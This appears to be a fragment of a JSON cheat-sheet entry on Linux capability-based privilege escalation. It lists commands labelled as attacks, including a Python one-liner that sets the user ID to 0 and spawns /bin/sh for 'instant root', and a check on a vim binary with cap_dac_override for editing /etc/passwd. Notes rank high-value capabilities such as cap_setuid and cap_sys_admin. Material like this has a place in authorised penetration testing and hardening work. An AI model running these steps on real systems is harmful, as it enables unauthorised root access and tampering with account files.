    {
      "label": "cap_dac_override -> bypass file perms (edit /etc/passwd)",
      "command": "getcap /usr/bin/vim.basic"
    },
    {
      "label": "cap_setuid on python -> instant root",
      "command": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
    }
  ],
  "notes": "Flags:\n =    clear capability, no privileges\n +ep  effective + permitted\n +ei  effective + inheritable\n +p   permitted only\nHigh-value:\n cap_setuid        set effective UID (root)\n cap_setgid        set effective GID (root)\n cap_sys_admin     broad admin privileges\n cap_dac_override  bypass file r/w/x permission checks",
